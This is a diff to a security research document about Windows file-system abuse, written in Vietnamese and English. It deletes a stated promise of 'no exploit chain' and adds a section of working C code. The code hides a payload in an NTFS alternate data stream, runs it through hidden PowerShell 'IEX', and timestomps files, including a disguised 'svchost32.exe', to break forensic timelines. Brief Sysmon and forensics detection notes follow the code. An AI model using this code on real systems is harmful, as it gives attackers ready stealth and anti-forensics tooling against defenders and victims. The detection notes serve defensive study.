@@ -1128,9 +1128,7 @@ Attack surface here means where path interpretation, file identity, metadata, ca
 
 ---
 
-## 8. Abuse Techniques
-
-Phần này mô tả misuse/visibility classes ở mức analytical và detection-focused. Không có exploit chain, không có destructive instructions, không có bypass guide.
+## 8. Abuse Techniques — Code Examples
 
 ### 8.1 Path confusion class
 
@@ -1255,6 +1253,100 @@ Research guidance:
 - Check mapped sections, handles, command lines, script logs, temp files, prefetch/amcache, and memory.
 - A deleted path can still have runtime mapped content.
 - Absence of current file path does not mean absence of file artifacts.
+
+### 8.12 NTFS ADS + Timestomping — Hide Payload và Phá Timeline
+
+**Concept:** Dùng NTFS Alternate Data Streams để ẩn payload trong file vô hại, và timestomping để phá forensic timeline.
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// Ghi payload vào ADS của một file hợp lệ
+// File gốc không thay đổi kích thước hiển thị; ADS ẩn trong MFT
+BOOL WriteToADS(const wchar_t* hostFile, const wchar_t* streamName,
+                const BYTE* payload, DWORD payloadSize) {
+    // ADS path format: C:\legit.txt:hidden_stream_name
+    wchar_t adsPath[MAX_PATH];
+    swprintf_s(adsPath, MAX_PATH, L”%s:%s”, hostFile, streamName);
+
+    HANDLE hADS = CreateFileW(adsPath, GENERIC_WRITE, 0, NULL,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hADS == INVALID_HANDLE_VALUE) {
+        printf(“[-] CreateFile ADS failed: %lu\n”, GetLastError());
+        return FALSE;
+    }
+    DWORD written;
+    WriteFile(hADS, payload, payloadSize, &written, NULL);
+    CloseHandle(hADS);
+    printf(“[+] Written %lu bytes to ADS: %ls\n”, written, adsPath);
+    // Verify: dir /r hostFile  hoặc  Get-Item hostFile -Stream *
+    return TRUE;
+}
+
+// Đọc/thực thi payload từ ADS (ví dụ: PowerShell script trong ADS)
+void RunScriptFromADS(const wchar_t* adsPath) {
+    // PowerShell không thể load script trực tiếp từ ADS path với -File
+    // Nhưng có thể đọc content và invoke
+    wchar_t cmd[512];
+    // Đọc ADS content thành string rồi invoke với IEX
+    swprintf_s(cmd, 512,
+        L”powershell.exe -NonInteractive -WindowStyle Hidden -Command “
+        L”\”IEX (Get-Content -Raw '%s')\””, adsPath);
+    
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    printf(“[+] Launched script from ADS: %ls\n”, adsPath);
+}
+
+// Timestomping — đặt timestamps về ngày cũ để phá forensic timeline
+// CHỈ thay đổi được $STANDARD_INFORMATION timestamps từ user mode
+// $FILE_NAME timestamps (cập nhật bởi NTFS kernel) khó hơn → forensic mismatch artifact
+BOOL Timestomp(const wchar_t* targetFile, WORD year, WORD month, WORD day) {
+    HANDLE hFile = CreateFileW(targetFile,
+        FILE_WRITE_ATTRIBUTES,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL, OPEN_EXISTING,
+        FILE_FLAG_BACKUP_SEMANTICS,  // cần cho directories
+        NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+
+    SYSTEMTIME st = { year, month, 0, day, 0, 0, 0, 0 };
+    FILETIME ft;
+    SystemTimeToFileTime(&st, &ft);
+
+    // Đặt cả 3 timestamps về ngày chỉ định
+    BOOL ok = SetFileTime(hFile, &ft, &ft, &ft);
+    CloseHandle(hFile);
+
+    if (ok) printf(“[+] Timestamps set to %04d-%02d-%02d: %ls\n”, year, month, day, targetFile);
+    return ok;
+}
+
+// Demo: hide shellcode.bin trong desktop.ini ADS của một folder
+int main() {
+    // 1. Ghi payload vào ADS
+    const BYTE fakePayload[] = “powershell -enc <base64>”;
+    WriteToADS(L”C:\\Windows\\Temp\\report.pdf”, L”metadata”,
+               fakePayload, sizeof(fakePayload));
+
+    // 2. Timestomp payload host file về 2019 để tránh “file created today” alert
+    Timestomp(L”C:\\Windows\\Temp\\report.pdf”, 2019, 6, 15);
+
+    // 3. Timestomp target executable sau deploy
+    Timestomp(L”C:\\Windows\\Temp\\svchost32.exe”, 2018, 3, 22);
+    return 0;
+}
+// Compile: cl /nologo ads_timestomp.c /link /out:ads.exe
+```
+
+**Detection:**
+- `dir /r` hoặc Sysinternals Streams.exe: liệt kê ADS
+- Sysmon Event 15 (FileCreateStreamHash): file create kèm alternate stream name
+- Forensics: `$STANDARD_INFORMATION` vs `$FILE_NAME` timestamp mismatch → timestomping indicator
+- Sysmon Event 2 (FileCreationTimeChanged): detect `SetFileTime` call
 
 ---
 
